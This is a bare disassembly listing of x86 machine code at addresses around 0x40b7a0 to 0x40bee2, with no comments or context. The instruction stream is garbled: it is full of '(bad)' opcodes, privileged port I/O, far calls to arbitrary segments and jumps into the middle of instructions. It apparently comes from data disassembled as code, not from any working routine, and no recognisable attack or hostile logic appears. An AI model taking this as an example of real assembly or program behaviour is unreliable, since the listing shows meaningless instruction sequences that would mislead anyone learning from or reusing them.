  40b7a0:	shl    edi,1
  40b7a2:	add    ebx,eax
  40b7a4:	in     eax,0xf5
  40b7a6:	mov    dl,0x1a
  40b7a8:	push   0xc
  40b7aa:	pop    es
  40b7ab:	call   0x16ec:0x2d49c774
  40b7b2:	or     eax,DWORD PTR fs:0x859f0ab0
  40b7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7ba:	outs   dx,DWORD PTR ds:[esi]
  40b7bb:	adc    eax,0xa95f9f4e
  40b7c0:	jge    0x40b7c3
  40b7c2:	retf   
  40b7c3:	sbb    BYTE PTR [esi],dh
  40b7c5:	pop    edx
  40b7c6:	adc    DWORD PTR [ebx+0x70ab712e],ebp
  40b7cc:	adc    al,0xa2
  40b7ce:	sub    al,0x60
  40b7d0:	jbe    0x40b784
  40b7d2:	iret   
  40b7d3:	stos   BYTE PTR es:[edi],al
  40b7d4:	int3   
  40b7d5:	int    0xb
  40b7d7:	sub    DWORD PTR [ebx],edi
  40b7d9:	adc    ah,BYTE PTR [edx+0x34]
  40b7dc:	jo     0x40b75f
  40b7de:	stc    
  40b7df:	and    edx,DWORD PTR [edi]
  40b7e1:	cmp    al,0x85
  40b7e3:	pop    esp
  40b7e4:	sbb    edx,DWORD PTR [ebx-0x53db21f4]
  40b7ea:	mov    ah,0xb5
  40b7ec:	push   ecx
  40b7ed:	adc    al,0x22
  40b7ef:	pop    es
  40b7f0:	popa   
  40b7f1:	enter  0x16ca,0x9a
  40b7f5:	ret    0xfdee
  40b7f8:	xchg   esp,eax
  40b7f9:	mov    ecx,0xdff7d621
  40b7fe:	imul   di,WORD PTR [ebx],0xea7f
  40b803:	test   BYTE PTR [ecx],ah
  40b805:	cs jp  0x40b870
  40b808:	popa   
  40b809:	sub    BYTE PTR [eax+0x6c],ah
  40b80c:	lods   al,BYTE PTR ds:[esi]
  40b80d:	(bad)  
  40b80e:	cmp    dl,BYTE PTR [ebp-0x79cd1cdb]
  40b814:	mov    bl,0x49
  40b816:	dec    BYTE PTR [eax-0x20e73df0]
  40b81c:	stos   BYTE PTR es:[edi],al
  40b81d:	cwde   
  40b81e:	pop    ebp
  40b81f:	dec    esi
  40b820:	mov    ebp,0xadefb790
  40b825:	cwde   
  40b826:	fidiv  DWORD PTR [edx]
  40b828:	jae    0x40b7cc
  40b82a:	sti    
  40b82b:	pop    edx
  40b82c:	or     bl,BYTE PTR [esi-0xb]
  40b82f:	mov    ecx,0x1084d48f
  40b834:	rol    DWORD PTR [ecx+0x3f],cl
  40b837:	arpl   WORD PTR [edi+0x7f],bx
  40b83a:	sbb    DWORD PTR [ebx-0x4a702dd9],edi
  40b840:	scas   eax,DWORD PTR es:[edi]
  40b841:	addr16 (bad) 
  40b843:	test   BYTE PTR es:[eax],0xbb
  40b847:	sub    bh,dl
  40b849:	in     al,0xc9
  40b84b:	call   0x28a56f5f
  40b850:	pop    DWORD PTR [ebx+eax*1]
  40b853:	mov    ds:0xedaece97,al
  40b858:	mov    esi,0x3c22ad9f
  40b85d:	es inc bp
  40b860:	add    BYTE PTR [ebx+ebx*1+0x7229c024],dl
  40b867:	int3   
  40b868:	in     eax,dx
  40b869:	push   ebp
  40b86a:	sub    eax,0x15db3dc8
  40b86f:	adc    al,bl
  40b871:	cmp    edi,DWORD PTR [edi-0x30]
  40b874:	sub    DWORD PTR [edx+esi*2+0x78],esi
  40b878:	mov    esp,0xfc8f4836
  40b87d:	pop    esi
  40b87e:	or     al,BYTE PTR [eax+0x5c]
  40b881:	cli    
  40b882:	or     eax,0xfac7af0c
  40b887:	adc    al,0xdf
  40b889:	dec    edi
  40b88a:	in     eax,dx
  40b88b:	ins    BYTE PTR es:[edi],dx
  40b88c:	or     al,0x60
  40b88e:	neg    BYTE PTR ds:0xfaa53102
  40b894:	push   0x5ad85586
  40b899:	or     al,0x93
  40b89b:	adc    dh,BYTE PTR [ebp-0x6f]
  40b89e:	or     bl,BYTE PTR [eax+0x4d]
  40b8a1:	nop    DWORD PTR [edx+0x64]
  40b8a6:	adc    al,0xcf
  40b8a8:	jne    0x40b8e9
  40b8aa:	or     bh,ah
  40b8ac:	sbb    al,0x1
  40b8ae:	pushf  
  40b8af:	cld    
  40b8b0:	pop    edi
  40b8b1:	inc    ebp
  40b8b2:	xchg   ebp,eax
  40b8b3:	cmp    eax,edx
  40b8b5:	leave  
  40b8b6:	pop    ecx
  40b8b7:	addr16 push 0xffffffb5
  40b8ba:	(bad)  
  40b8bb:	gs mov esi,0x70f643d
  40b8c1:	dec    edi
  40b8c2:	ret    
  40b8c3:	inc    edx
  40b8c4:	enter  0x14bb,0x71
  40b8c8:	fdivp  st(6),st
  40b8ca:	jb     0x40b883
  40b8cc:	(bad)  
  40b8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ce:	stos   DWORD PTR es:[edi],eax
  40b8cf:	push   esp
  40b8d0:	(bad)  
  40b8d1:	iret   
  40b8d2:	add    dl,BYTE PTR [ebp+0x11]
  40b8d5:	jb     0x40b89d
  40b8d7:	fcmovu st,st(6)
  40b8d9:	les    edx,FWORD PTR [edi+0x6e]
  40b8dc:	or     ebx,DWORD PTR [ebx+0x1290eae8]
  40b8e2:	pop    ss
  40b8e3:	mov    ch,0xad
  40b8e5:	repz jmp 0x40b91c
  40b8e8:	dec    ebx
  40b8e9:	mov    ebp,0x28d0b10f
  40b8ee:	das    
  40b8ef:	inc    ebp
  40b8f0:	pop    edi
  40b8f1:	in     al,0x66
  40b8f3:	dec    ecx
  40b8f4:	jl     0x40b8aa
  40b8f6:	lds    edi,FWORD PTR [edx-0xb]
  40b8f9:	adc    al,0xf8
  40b8fb:	mov    DWORD PTR [esi],edx
  40b8fd:	pop    edi
  40b8fe:	in     eax,0x3d
  40b900:	sbb    BYTE PTR [esi+0x21],dh
  40b903:	jmp    0x40b957
  40b905:	xor    eax,0x9b0c9579
  40b90a:	mov    ch,0xd5
  40b90c:	les    ebp,FWORD PTR [ecx+ebx*2-0x44]
  40b910:	test   BYTE PTR [ebx-0x17912898],0x73
  40b917:	and    bh,bl
  40b919:	pop    edi
  40b91a:	adc    DWORD PTR [ebx+0x72],esp
  40b91d:	and    ebx,DWORD PTR [ecx]
  40b91f:	xchg   DWORD PTR [edx],ebp
  40b921:	and    ebp,eax
  40b923:	and    eax,0x235896f5
  40b928:	pop    es
  40b929:	pusha  
  40b92a:	dec    ebp
  40b92b:	cmp    DWORD PTR [esi-0x2d],eax
  40b92e:	push   ebx
  40b92f:	mov    ds:0x1ed9fb81,al
  40b934:	mov    ebx,0xc10afd2
  40b939:	mov    al,0x45
  40b93b:	lock retf 0x3291
  40b93f:	daa    
  40b940:	icebp  
  40b941:	fcom   st(5)
  40b943:	xchg   esi,eax
  40b944:	pop    ebp
  40b945:	jle    0x40b963
  40b947:	outs   dx,BYTE PTR ds:[esi]
  40b948:	hlt    
  40b949:	cdq    
  40b94a:	mov    ds:0x6321b401,eax
  40b94f:	inc    ebx
  40b950:	test   eax,0xea1ad206
  40b955:	jl     0x40b8e0
  40b957:	retf   
  40b958:	scas   eax,DWORD PTR es:[edi]
  40b959:	ret    
  40b95a:	xchg   edx,eax
  40b95b:	jnp    0x40b941
  40b95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95e:	mov    BYTE PTR [esi],cl
  40b960:	dec    eax
  40b961:	jp     0x40b933
  40b963:	mov    ebp,ebx
  40b965:	adc    esi,ebp
  40b967:	cwde   
  40b968:	shl    bl,cl
  40b96a:	push   edi
  40b96b:	lods   al,BYTE PTR ds:[esi]
  40b96c:	mov    eax,ds:0x9d543940
  40b971:	add    al,0x9d
  40b973:	repz enter 0x611,0x0
  40b978:	mov    DWORD PTR [eax-0x7dc6f59],edi
  40b97e:	lahf   
  40b97f:	call   0x19fec5
  40b984:	fcomp  QWORD PTR [ecx-0x5fb4b2f8]
  40b98a:	push   0xffffffc6
  40b98c:	pop    ebp
  40b98d:	xor    al,0xf
  40b98f:	rol    eax,1
  40b991:	retf   0xfd5d
  40b994:	xchg   edi,eax
  40b995:	pop    edi
  40b996:	push   edi
  40b997:	jnp    0x40b960
  40b999:	test   ebx,ebx
  40b99b:	mov    edx,0x87b2762a
  40b9a0:	mov    ebp,0x9cef0ae1
  40b9a5:	in     al,0xbe
  40b9a7:	popa   
  40b9a8:	xor    dh,BYTE PTR [eax-0x134acb46]
  40b9ae:	gs cwde 
  40b9b0:	add    eax,0x165c7b6d
  40b9b5:	lods   al,BYTE PTR ds:[esi]
  40b9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b7:	in     al,dx
  40b9b8:	shr    DWORD PTR [ebp+0x6bff9110],cl
  40b9be:	enter  0x3f02,0xc8
  40b9c2:	ins    DWORD PTR es:[edi],dx
  40b9c3:	push   ebp
  40b9c4:	adc    DWORD PTR [edx+0x5f],edi
  40b9c7:	cmc    
  40b9c8:	cwde   
  40b9c9:	and    eax,0x7ea2ee40
  40b9ce:	stos   DWORD PTR es:[edi],eax
  40b9cf:	data16 out 0x55,al
  40b9d2:	dec    ebx
  40b9d3:	jmp    0x9c4b:0x43f4ca66
  40b9da:	stc    
  40b9db:	mov    ebp,0x76b91ac2
  40b9e0:	popf   
  40b9e1:	or     eax,0x94c93a3e
  40b9e6:	adc    al,0x58
  40b9e8:	sbb    dl,0x2a
  40b9eb:	mov    eax,ds:0x8ba967c
  40b9f0:	imul   ebp,DWORD PTR [esi],0x15c4c758
  40b9f6:	cmp    eax,0xfda8ddeb
  40b9fb:	sbb    eax,0x169afead
  40ba00:	scas   al,BYTE PTR es:[edi]
  40ba01:	add    eax,0xb312d8c9
  40ba06:	es inc esi
  40ba08:	rcr    BYTE PTR [ecx-0x63],0x98
  40ba0c:	je     0x40b9ad
  40ba0e:	xor    al,BYTE PTR [ebx]
  40ba10:	repnz and eax,0x5eaf1154
  40ba16:	cmp    eax,0x120f6bd6
  40ba1b:	popa   
  40ba1c:	outs   dx,DWORD PTR ds:[esi]
  40ba1d:	mov    ds,eax
  40ba1f:	repnz dec eax
  40ba21:	das    
  40ba22:	cli    
  40ba23:	sub    dl,BYTE PTR [edi]
  40ba25:	out    0x17,eax
  40ba27:	or     eax,0xc696c517
  40ba2c:	xchg   edi,eax
  40ba2d:	out    dx,ax
  40ba2f:	(bad)
  40ba32:	mov    edx,0xb5aba80b
  40ba37:	lds    edx,FWORD PTR [ecx-0x67]
  40ba3a:	(bad)  
  40ba3b:	fadd   DWORD PTR [ebp-0x32]
  40ba3e:	mov    eax,ds:0xcf0e5efc
  40ba43:	leave  
  40ba44:	pusha  
  40ba45:	dec    ecx
  40ba46:	and    edx,DWORD PTR [edx]
  40ba48:	push   edi
  40ba49:	cmc    
  40ba4a:	mov    ah,0x58
  40ba4c:	add    DWORD PTR [ebp-0x1],edx
  40ba4f:	push   0xffffffbf
  40ba51:	adc    al,0x80
  40ba53:	dec    edx
  40ba54:	jmp    0x36cd7ae2
  40ba59:	jge    0x40ba24
  40ba5b:	xor    DWORD PTR [esi-0x41b6a84e],edx
  40ba61:	(bad)  
  40ba62:	xor    ch,BYTE PTR [esi]
  40ba64:	mov    eax,0xda0d2235
  40ba69:	test   eax,0x4872b9fe
  40ba6e:	(bad)  
  40ba70:	cmp    DWORD PTR [ebx],ebp
  40ba72:	aaa    
  40ba73:	cmp    BYTE PTR [ebp-0x68962f03],bl
  40ba79:	xchg   edi,eax
  40ba7a:	and    DWORD PTR [eax+0x1d],0xed5a5d9c
  40ba81:	jne    0x40ba1d
  40ba83:	jae    0x40ba75
  40ba85:	stos   BYTE PTR es:[edi],al
  40ba86:	gs xchg edx,eax
  40ba88:	pushf  
  40ba89:	push   ecx
  40ba8a:	cmp    DWORD PTR [ecx-0x635a79a7],edx
  40ba90:	outs   dx,BYTE PTR ds:[esi]
  40ba91:	jb     0x40ba61
  40ba93:	int3   
  40ba94:	les    ebx,FWORD PTR [ebx]
  40ba96:	sar    DWORD PTR [ebx+0x24],cl
  40ba99:	fs cmc 
  40ba9b:	adc    DWORD PTR [edi-0x4f],ecx
  40ba9e:	lods   al,BYTE PTR ds:[esi]
  40ba9f:	nop
  40baa0:	jg     0x40bab7
  40baa2:	add    BYTE PTR [ecx+0x26],cl
  40baa5:	push   ebx
  40baa6:	dec    ebp
  40baa7:	mov    ebx,0xcd3bfe29
  40baac:	enter  0xdab7,0x8d
  40bab0:	dec    eax
  40bab1:	and    esp,esi
  40bab3:	cmp    BYTE PTR [edi],0x91
  40bab6:	nop
  40bab7:	pop    ss
  40bab8:	pusha  
  40bab9:	mov    dl,0x14
  40babb:	adc    ah,BYTE PTR [eax+0x33]
  40babe:	inc    ecx
  40babf:	dec    esp
  40bac0:	sub    BYTE PTR [edi-0x22228aed],ch
  40bac6:	inc    ebx
  40bac7:	xchg   ebp,eax
  40bac8:	inc    esi
  40bac9:	stos   BYTE PTR es:[edi],al
  40baca:	mov    cl,0xb2
  40bacc:	mov    edi,0x5e6f88d7
  40bad1:	ret    0x5e72
  40bad4:	out    0x4c,eax
  40bad6:	shl    al,1
  40bad8:	into   
  40bad9:	ret    0xa6c0
  40badc:	shr    BYTE PTR [eax-0x1f],1
  40badf:	icebp  
  40bae0:	cld    
  40bae1:	sbb    BYTE PTR [ecx],al
  40bae3:	adc    DWORD PTR [edi],edx
  40bae5:	pop    edi
  40bae6:	pop    edi
  40bae7:	repz aam 0xf2
  40baea:	pop    es
  40baeb:	push   ebx
  40baec:	pusha  
  40baed:	add    ah,dh
  40baef:	sbb    eax,0x329370b4
  40baf4:	xchg   ebx,eax
  40baf5:	mov    ebp,0xf2b51acc
  40bafa:	aas    
  40bafb:	xchg   edx,eax
  40bafc:	mov    edx,0x9d4b0f92
  40bb01:	push   edx
  40bb02:	daa    
  40bb03:	jl     0x40bb7a
  40bb05:	popf   
  40bb06:	into   
  40bb07:	sbb    dh,BYTE PTR [ebx]
  40bb09:	enter  0x8c3c,0xc1
  40bb0d:	or     esi,esi
  40bb0f:	pop    ebp
  40bb10:	push   eax
  40bb11:	mov    bh,0xf7
  40bb13:	fldcw  WORD PTR [eax-0x47]
  40bb16:	sbb    BYTE PTR ds:0xf7e0407b,cl
  40bb1c:	std    
  40bb1d:	inc    edx
  40bb1e:	ss mov eax,esi
  40bb21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb22:	or     DWORD PTR [ebp-0x7c39066f],ebx
  40bb28:	leave  
  40bb29:	lock test DWORD PTR [eax],esi
  40bb2c:	jmp    0xc04ea131
  40bb31:	sbb    bh,BYTE PTR [edx-0x6695783f]
  40bb37:	xchg   esp,eax
  40bb38:	call   0xa1665d80
  40bb3d:	sbb    dh,BYTE PTR [eax+0x1e]
  40bb40:	cdq    
  40bb41:	xor    edi,DWORD PTR [eax+0x54c5181c]
  40bb47:	gs aad 0x93
  40bb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb4b:	inc    edi
  40bb4c:	add    dh,bl
  40bb4e:	in     eax,dx
  40bb4f:	xchg   esi,eax
  40bb50:	xchg   edx,eax
  40bb51:	psubusb mm4,QWORD PTR [edx-0x2653f165]
  40bb58:	push   ds
  40bb59:	jp     0x40bb79
  40bb5b:	add    esp,eax
  40bb5d:	jb     0x40bb59
  40bb5f:	out    0xef,al
  40bb61:	imul   edx,esp,0x2a
  40bb64:	push   ebp
  40bb65:	xlat   BYTE PTR ds:[ebx]
  40bb66:	pop    ebx
  40bb67:	fcom   DWORD PTR [esi+0x41]
  40bb6a:	cld    
  40bb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6c:	pop    ebx
  40bb6d:	and    eax,DWORD PTR [eax+ebp*8-0x1d]
  40bb71:	inc    esi
  40bb72:	inc    ebp
  40bb73:	pop    ds
  40bb74:	adc    BYTE PTR [ebx],bl
  40bb76:	test   eax,0x7f39f37
  40bb7b:	fst    QWORD PTR [ecx]
  40bb7d:	cmp    eax,0x3311d019
  40bb82:	aam    0xda
  40bb84:	pop    ecx
  40bb85:	scas   eax,DWORD PTR es:[edi]
  40bb86:	sbb    BYTE PTR [ecx],ah
  40bb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb89:	retf   
  40bb8a:	inc    ebp
  40bb8b:	mov    edi,0xb4866774
  40bb90:	jns    0x40bbab
  40bb92:	xor    al,0xa4
  40bb94:	mov    ebp,0x32427ef9
  40bb99:	pusha  
  40bb9a:	(bad)  
  40bb9b:	cli    
  40bb9c:	mov    ah,0x4c
  40bb9e:	adc    ah,0x87
  40bba1:	xchg   DWORD PTR [ebx],esp
  40bba3:	(bad)  [edi]
  40bba5:	and    eax,DWORD PTR [ebp-0x31c66963]
  40bbab:	jmp    0x40bb73
  40bbad:	rol    DWORD PTR [ecx],cl
  40bbaf:	jmp    0x191d37bf
  40bbb4:	adc    eax,DWORD PTR ds:0x551778a5
  40bbba:	mov    esi,0x2f9ece13
  40bbbf:	hlt    
  40bbc0:	int3   
  40bbc1:	push   0xf5a8d63e
  40bbc6:	aam    0x34
  40bbc8:	push   esi
  40bbc9:	out    dx,al
  40bbca:	data16 mov WORD PTR [edx-0x6004d5e6],gs
  40bbd1:	adc    ch,bl
  40bbd3:	lods   eax,DWORD PTR ds:[esi]
  40bbd4:	in     al,dx
  40bbd5:	pop    ss
  40bbd6:	call   0xb20086af
  40bbdb:	jle    0x40bc24
  40bbdd:	adc    ah,BYTE PTR [edx+esi*8+0x38]
  40bbe1:	aaa    
  40bbe2:	or     ch,BYTE PTR [edx-0x55]
  40bbe5:	retf   0x7c2
  40bbe8:	push   ebp
  40bbe9:	push   esi
  40bbea:	shl    DWORD PTR ds:0xce8597a4,0xd8
  40bbf1:	or     DWORD PTR [ebp-0x2a],esi
  40bbf4:	adc    esi,edi
  40bbf6:	(bad)  [eax+ecx*1+0x55c901d3]
  40bbfd:	pop    ss
  40bbfe:	cwde   
  40bbff:	dec    ecx
  40bc00:	out    dx,eax
  40bc01:	es mov dl,0x4
  40bc04:	out    0x8e,eax
  40bc06:	push   ds
  40bc07:	or     eax,0x8dee2fd6
  40bc0c:	test   DWORD PTR [ebx-0xf],ebp
  40bc0f:	or     eax,0xb4fdefee
  40bc14:	out    0xef,eax
  40bc16:	outs   dx,BYTE PTR ds:[esi]
  40bc17:	jp     0x40bbb4
  40bc19:	sub    ah,dh
  40bc1b:	imul   ebx,DWORD PTR [edx+0xd],0x42
  40bc1f:	mov    al,BYTE PTR [ebp+0x38]
  40bc22:	add    BYTE PTR [ecx+0x66],bh
  40bc25:	pop    eax
  40bc26:	xchg   esi,eax
  40bc27:	imul   ecx
  40bc29:	call   0xfae3de8c
  40bc2e:	mov    al,ds:0x8d605f65
  40bc33:	aam    0x56
  40bc35:	xor    edx,esi
  40bc37:	sub    eax,0x48424a9b
  40bc3c:	std    
  40bc3d:	repz push es
  40bc3f:	nop
  40bc40:	add    BYTE PTR [ebx],dh
  40bc42:	xchg   ebp,eax
  40bc43:	outs   dx,BYTE PTR ds:[esi]
  40bc44:	nop
  40bc45:	mov    ebx,0x5f4f3c16
  40bc4a:	lock ret 
  40bc4c:	arpl   WORD PTR [edi],ax
  40bc4e:	imul   edi,DWORD PTR [esi+0x783f3411],0x39
  40bc55:	add    al,0xd3
  40bc57:	jae    0x40bc54
  40bc59:	ja     0x40bc69
  40bc5b:	add    edi,ebx
  40bc5d:	stos   DWORD PTR es:[edi],eax
  40bc5e:	jo     0x40bc87
  40bc60:	sub    BYTE PTR [edx],bl
  40bc62:	in     al,0xe6
  40bc64:	push   eax
  40bc65:	fst    DWORD PTR [ebx]
  40bc67:	dec    eax
  40bc68:	mov    esi,DWORD PTR ds:0x569d4e39
  40bc6e:	or     ecx,esi
  40bc70:	jle    0x40bc88
  40bc72:	in     al,0x9
  40bc74:	jne    0x40bc19
  40bc76:	sbb    eax,0xb17bdd83
  40bc7b:	or     eax,0x1d38933b
  40bc80:	mov    ch,0xed
  40bc82:	and    al,0xb0
  40bc84:	repz adc eax,0x94c7dcae
  40bc8a:	(bad)  
  40bc8b:	rcl    BYTE PTR [ecx+ebx*8],1
  40bc8e:	add    eax,0xd14cdca0
  40bc93:	out    0xc0,eax
  40bc95:	sti    
  40bc96:	pop    edx
  40bc97:	mov    edi,0x903f1a32
  40bc9c:	icebp  
  40bc9d:	shl    DWORD PTR [ebx-0x7e5e4bbc],1
  40bca3:	sub    eax,ebx
  40bca5:	xor    DWORD PTR [ebx-0x731e99ff],esi
  40bcab:	rcr    DWORD PTR [eax-0x27],0x9
  40bcaf:	in     eax,dx
  40bcb0:	ret    0x95de
  40bcb3:	sbb    dh,dh
  40bcb5:	fisubr DWORD PTR [edx+edi*1+0x52b23604]
  40bcbc:	rol    BYTE PTR [eax],1
  40bcbe:	into   
  40bcbf:	push   ecx
  40bcc0:	call   0x57646d19
  40bcc5:	xor    al,0x5
  40bcc7:	test   BYTE PTR [edi+0x5d],dh
  40bcca:	idiv   DWORD PTR [edx]
  40bccc:	mov    eax,ds:0x9069e9ef
  40bcd1:	cli    
  40bcd2:	xchg   edi,eax
  40bcd3:	in     eax,dx
  40bcd4:	sub    al,0x3f
  40bcd6:	fisubr DWORD PTR [edi]
  40bcd8:	mov    WORD PTR [esi-0x3a7a4d80],?
  40bcde:	hlt    
  40bcdf:	gs test edx,esi
  40bce2:	xchg   ecx,eax
  40bce3:	inc    edx
  40bce4:	xchg   ebp,ebx
  40bce6:	xor    al,0x19
  40bce8:	iret   
  40bce9:	sub    ebx,edi
  40bceb:	jnp    0x40bcf9
  40bced:	dec    ecx
  40bcee:	scas   eax,DWORD PTR es:[edi]
  40bcef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf0:	cmc    
  40bcf1:	adc    eax,0xe7a875a2
  40bcf6:	aad    0x2f
  40bcf8:	in     al,0x3c
  40bcfa:	hlt    
  40bcfb:	jae    0x40bcb9
  40bcfd:	adc    edx,DWORD PTR [edi-0x7f]
  40bd00:	popf   
  40bd01:	repz out dx,al
  40bd03:	scas   eax,DWORD PTR es:[edi]
  40bd04:	and    BYTE PTR [edx-0x3842ec7a],al
  40bd0a:	daa    
  40bd0b:	sbb    DWORD PTR [edx+0x1eb4c1c2],ebx
  40bd11:	in     eax,0x92
  40bd13:	sti    
  40bd14:	mov    ds:0xfd31156e,al
  40bd19:	xor    al,0x6d
  40bd1b:	call   0xbdf98db
  40bd20:	pop    esi
  40bd21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd22:	cdq    
  40bd23:	mov    es,ebx
  40bd25:	(bad)  
  40bd26:	popf   
  40bd27:	test   DWORD PTR [esi+ebp*4+0x50],ebp
  40bd2b:	jo     0x40bdab
  40bd2d:	dec    edx
  40bd2e:	ja     0x40bd45
  40bd30:	imul   edi,DWORD PTR [ebx],0x64
  40bd33:	aas    
  40bd34:	jge    0x40bd6d
  40bd36:	push   ecx
  40bd37:	add    eax,0x2987e80f
  40bd3c:	inc    esp
  40bd3d:	retf   0x3683
  40bd40:	jmp    0x40bd3e
  40bd42:	loopne 0x40bd35
  40bd44:	mov    ah,0x2d
  40bd46:	addr16 (bad) 
  40bd49:	xchg   ecx,eax
  40bd4a:	mov    ecx,0x2126f3d2
  40bd4f:	data16 lods al,BYTE PTR ds:[esi]
  40bd51:	cmp    eax,0xf6993e1f
  40bd56:	rcr    BYTE PTR [edi],0xff
  40bd59:	fild   WORD PTR [ebx+0xf58e74]
  40bd5f:	pop    es
  40bd60:	sbb    BYTE PTR [ecx],ah
  40bd62:	xchg   dh,bh
  40bd64:	in     al,dx
  40bd65:	ins    BYTE PTR es:[edi],dx
  40bd66:	and    DWORD PTR [edx+eax*8+0x43],ecx
  40bd6a:	(bad)  
  40bd6b:	repz dec edi
  40bd6d:	pop    ecx
  40bd6e:	loop   0x40bde3
  40bd70:	ds loope 0x40bd2c
  40bd73:	push   0x1c
  40bd75:	jmp    0x766eb181
  40bd7a:	or     eax,0xdeb19ca
  40bd7f:	dec    ecx
  40bd80:	xchg   ebp,eax
  40bd81:	adc    ah,BYTE PTR [ecx+0x118a9aae]
  40bd87:	mov    ecx,0x13624214
  40bd8c:	xchg   esp,eax
  40bd8d:	push   es
  40bd8e:	into   
  40bd8f:	loope  0x40bde3
  40bd91:	adc    ch,BYTE PTR [esi]
  40bd93:	and    DWORD PTR [edx],0xa1c412e7
  40bd99:	mov    ah,cl
  40bd9b:	mov    al,ds:0x97dfe596
  40bda0:	pop    ss
  40bda1:	mov    dl,0x1b
  40bda3:	and    BYTE PTR [esi+0x4a56cbe3],dl
  40bda9:	mov    dh,0xde
  40bdab:	(bad)  
  40bdac:	stos   DWORD PTR es:[edi],eax
  40bdad:	jne    0x40bd78
  40bdaf:	add    BYTE PTR ds:0xff3d1034,ch
  40bdb5:	xchg   ebx,eax
  40bdb6:	mov    bh,dl
  40bdb8:	push   edx
  40bdb9:	pusha  
  40bdba:	pop    edi
  40bdbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdbc:	lahf   
  40bdbd:	aam    0x93
  40bdbf:	mov    ebx,DWORD PTR [edx]
  40bdc1:	rcl    DWORD PTR [ebp-0x3],1
  40bdc4:	ins    BYTE PTR es:[edi],dx
  40bdc5:	sbb    dh,BYTE PTR [ebx-0x6b]
  40bdc8:	rcl    BYTE PTR [edi],0x68
  40bdcb:	mov    ebp,0x828ad402
  40bdd0:	in     al,0x5b
  40bdd2:	add    al,0x43
  40bdd4:	mov    ds,edi
  40bdd6:	sbb    BYTE PTR [ebx-0x37],cl
  40bdd9:	push   eax
  40bdda:	push   ds
  40bddb:	push   edx
  40bddc:	inc    ebx
  40bddd:	inc    ebp
  40bdde:	sub    esp,DWORD PTR [ecx+0x55]
  40bde1:	out    0x27,al
  40bde3:	sub    DWORD PTR [edi+0x1abbe383],edi
  40bde9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdea:	sbb    al,0x34
  40bdec:	jmp    0x1428:0xc31c7e16
  40bdf3:	punpcklbw mm1,DWORD PTR [esp+eax*8]
  40bdf7:	mov    eax,ds:0xea47226f
  40bdfc:	stc    
  40bdfd:	ror    BYTE PTR [ebp-0x3d66b2f4],cl
  40be03:	mov    al,ds:0x49f9a22d
  40be08:	mov    ebp,0xbe49eaed
  40be0d:	sub    BYTE PTR [ecx+eiz*4],0x8e
  40be11:	(bad)  
  40be12:	imul   edx,ebp,0xb2d58db1
  40be18:	xchg   esp,eax
  40be19:	(bad)  
  40be1a:	adc    edi,DWORD PTR [eax+0x47b4ade8]
  40be20:	pop    ebp
  40be21:	ror    bl,cl
  40be23:	(bad)  
  40be24:	jg     0x40be95
  40be26:	inc    ebx
  40be27:	inc    esp
  40be28:	(bad)  
  40be2a:	int    0x90
  40be2c:	in     al,dx
  40be2d:	pop    es
  40be2e:	push   0x47ed0bca
  40be33:	test   al,0x29
  40be35:	addr16 dec edi
  40be37:	or     dh,BYTE PTR [ecx+0x1285486a]
  40be3d:	call   0x1d13a0dd
  40be42:	pusha  
  40be43:	mov    dh,0xea
  40be45:	loope  0x40be3e
  40be47:	lods   eax,DWORD PTR ds:[esi]
  40be48:	fild   WORD PTR [edi+ecx*4]
  40be4b:	pop    esp
  40be4c:	loope  0x40be7a
  40be4e:	rcl    DWORD PTR [ebp-0x51],cl
  40be51:	out    0x92,eax
  40be53:	lods   al,BYTE PTR ds:[esi]
  40be54:	push   cs
  40be55:	push   eax
  40be56:	ret    0xd9e2
  40be59:	sbb    bh,dl
  40be5b:	xchg   DWORD PTR [edx-0x63],ecx
  40be5e:	ins    DWORD PTR es:[edi],dx
  40be5f:	pop    edi
  40be60:	cwde   
  40be61:	bound  edi,QWORD PTR [ebx-0x14]
  40be64:	cdq    
  40be65:	and    ebp,DWORD PTR [ebx+0x586bb664]
  40be6b:	repnz test BYTE PTR [ecx+0x2a],bh
  40be6f:	jge    0x40be81
  40be71:	xchg   ecx,eax
  40be72:	aaa    
  40be73:	bound  ecx,QWORD PTR [edx+eax*4-0x2]
  40be77:	cmc    
  40be78:	and    DWORD PTR [edx],ebp
  40be7a:	or     eax,0x19edc87c
  40be7f:	or     DWORD PTR [ebx-0x3f],ebp
  40be82:	rcl    dl,cl
  40be84:	dec    eax
  40be85:	mov    ecx,0x48a9626d
  40be8a:	inc    edi
  40be8b:	push   es
  40be8c:	sbb    DWORD PTR [ecx],eax
  40be8e:	xchg   esi,eax
  40be8f:	sar    DWORD PTR [eax-0x35ce2612],1
  40be95:	xor    esp,0x872938fc
  40be9b:	out    dx,al
  40be9c:	push   cs
  40be9d:	aam    0xb3
  40be9f:	mov    eax,0xeaefef40
  40bea4:	cld    
  40bea5:	sbb    DWORD PTR [ebx+0x3a2de362],0x34b43773
  40beaf:	mov    cl,0x7
  40beb1:	xor    dh,ch
  40beb3:	ud0    eax,DWORD PTR [ebp-0x53f68924]
  40beba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bebb:	dec    eax
  40bebc:	pushf  
  40bebd:	iret   
  40bebe:	fidivr WORD PTR [ebx-0x5a]
  40bec1:	loope  0x40beb7
  40bec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec4:	test   eax,0x65c615cd
  40bec9:	clc    
  40beca:	cmc    
  40becb:	ror    DWORD PTR [eax-0x1d11276c],0xc2
  40bed2:	imul   edx,DWORD PTR [eax-0x57],0xffffffba
  40bed6:	idiv   bl
  40bed8:	jb     0x40be8d
  40beda:	sub    edi,DWORD PTR [esi+0x64]
  40bedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bede:	jecxz  0x40bea8
  40bee0:	jmp    0x40be89
  40bee2:	and    DWORD PTR [ebp+esi*2-0x42],esp
